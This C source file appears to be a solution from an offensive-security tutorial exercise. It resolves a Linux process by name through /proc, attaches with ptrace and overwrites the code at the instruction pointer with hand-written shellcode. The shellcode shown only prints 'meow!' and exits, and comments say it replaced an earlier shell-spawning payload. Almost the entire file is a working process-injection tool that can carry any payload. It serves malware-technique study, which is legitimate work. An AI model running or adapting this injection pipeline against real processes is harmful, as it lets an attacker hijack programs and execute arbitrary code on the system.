/*
 * exercise 3 solution
 * linux injection: find process by name + inject custom shellcode
 * hack3.c
 * author: @cocomelonc
 *
 * combines:
 *   02-hacking-process-enum/hack.c  - /proc scan to resolve name → PID
 *   03-hacking-injection/hack.c     - ptrace injection pipeline
 *
 * change 1 (from injection hack.c):
 *   original: accepts a numeric PID as argv[1]
 *   updated:  accepts a process NAME as argv[1], resolves to PID via
 *             find_process_by_name() (same /proc/comm scan as hack.c)
 *
 * change 2 (payload):
 *   original payload: execve("/bin//sh") - replaces the victim process
 *   new payload:      write("meow!\n") + exit(0) - prints a string and
 *                     exits cleanly; observable without destroying the
 *                     target.  source: hack3.asm (JMP-CALL-POP, 32 bytes)
 *
 * compile:
 *   gcc hack3.c -o hack3
 *
 * usage:
 *   # terminal 1 - start victim
 *   ./meow &
 *
 *   # terminal 2 - inject by name
 *   ./hack3 meow
 *
 *   # expected: victim process prints "meow!" and then exits
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

/* ── exercise 3 addition 1: name → PID via /proc scan ─────────────────
 * copied from 02-hacking-process-enum/hack.c
 * reads /proc/<pid>/comm, matches case-sensitively, returns first PID
 */
static int find_process_by_name(const char *proc_name) {
  DIR *dir;
  struct dirent *entry;
  int pid = -1;

  dir = opendir("/proc");
  if (!dir) { perror("opendir /proc"); return -1; }

  while ((entry = readdir(dir)) != NULL) {
    if (!isdigit(*entry->d_name)) continue;

    char path[512];
    snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);

    FILE *fp = fopen(path, "r");
    if (!fp) continue;

    char comm[512];
    if (fgets(comm, sizeof(comm), fp)) {
      comm[strcspn(comm, "\r\n")] = 0;
      if (strcmp(comm, proc_name) == 0) {
        pid = atoi(entry->d_name);
        fclose(fp);
        break;
      }
    }
    fclose(fp);
  }
  closedir(dir);
  return pid;
}

/* ── memory helpers (unchanged from 03-hacking-injection/hack.c) ───── */

void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union { long val; char bytes[sizeof(long)]; } chunk;
  int i = 0;
  while (i < len / (int)sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}

void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union { long val; char bytes[sizeof(long)]; } chunk;
  int i = 0;
  while (i < len / (int)sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }
}

/* ── exercise 3 addition 2: new payload ─────────────────────────────
 * source: hack3.asm  (write("meow!\n", 6) + exit(0))
 * technique: JMP-CALL-POP for position-independent string addressing
 * 32 bytes, no null bytes
 *
 * layout:
 *   eb 13          jmp  call_push       (skip over instructions)
 *   5e             pop  rsi             (rsi = &"meow!\n")
 *   6a 01 5f       push 1 / pop rdi     (rdi = 1, stdout)
 *   6a 06 5a       push 6 / pop rdx     (rdx = 6, string length)
 *   6a 01 58       push 1 / pop rax     (rax = 1, sys_write)
 *   0f 05          syscall              (write)
 *   6a 3c 58       push 60 / pop rax    (rax = 60, sys_exit)
 *   31 ff          xor edi, edi         (exit code = 0)
 *   0f 05          syscall              (exit)
 *   e8 e8 ff ff ff call back            (push &string, jump to pop rsi)
 *   6d 65 6f 77 21 0a   "meow!\n"
 */
char payload[] =
  "\xeb\x13"           /* jmp call_push                     */
  "\x5e"               /* pop rsi                           */
  "\x6a\x01\x5f"       /* push 1  / pop rdi  (stdout)       */
  "\x6a\x06\x5a"       /* push 6  / pop rdx  (len)          */
  "\x6a\x01\x58"       /* push 1  / pop rax  (sys_write)    */
  "\x0f\x05"           /* syscall                           */
  "\x6a\x3c\x58"       /* push 60 / pop rax  (sys_exit)     */
  "\x31\xff"           /* xor edi, edi       (exit code 0)  */
  "\x0f\x05"           /* syscall                           */
  "\xe8\xe8\xff\xff\xff" /* call back (push &string)        */
  "\x6d\x65\x6f\x77\x21\x0a"; /* "meow!\n"                 */

int main(int argc, char *argv[]) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s <process_name>\n", argv[0]);
    return 1;
  }

  /*
   * exercise 3 change 1:
   * original: pid_t target_pid = atoi(argv[1]);  (numeric PID)
   * updated:  resolve the name to a PID at runtime
   */
  printf("[*] looking up '%s' in /proc...\n", argv[1]);
  pid_t target_pid = (pid_t)find_process_by_name(argv[1]);
  if (target_pid == -1) {
    fprintf(stderr, "[-] process '%s' not found\n", argv[1]);
    return 1;
  }
  printf("[+] found '%s', PID = %d\n", argv[1], target_pid);

  int payload_len = sizeof(payload) - 1; /* subtract null terminator */
  char original_code[payload_len];
  struct user_regs_struct target_regs;

  /* attach - same as original */
  printf("[*] attaching to process %d\n", target_pid);
  if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
    perror("[-] PTRACE_ATTACH failed");
    return 1;
  }
  waitpid(target_pid, NULL, 0);

  /* get registers */
  printf("[*] reading process registers\n");
  ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

  /* backup original code at RIP */
  printf("[*] backing up %d bytes at RIP (0x%llx)\n",
         payload_len, (unsigned long long)target_regs.rip);
  read_mem(target_pid, target_regs.rip, original_code, payload_len);

  /*
   * exercise 3 change 2:
   * original payload: execve /bin/sh (replaces process image)
   * new payload:      write("meow!\n") + exit(0)  (see hack3.asm)
   */
  printf("[*] injecting payload (%d bytes)\n", payload_len);
  write_mem(target_pid, target_regs.rip, payload, payload_len);

  /* resume - payload runs, prints "meow!" and calls exit(0) */
  printf("[*] resuming process\n");
  ptrace(PTRACE_CONT, target_pid, NULL, NULL);
  wait(NULL);   /* wait for the process to terminate */

  printf("[+] injection complete - target exited cleanly\n");

  /*
   * note: restore + detach are omitted because the payload calls exit(0),
   * which terminates the process before we could write back the original
   * code.  for a payload that returns (instead of exiting), restore and
   * detach would be necessary - see the original hack.c for that pattern.
   */
  return 0;
}
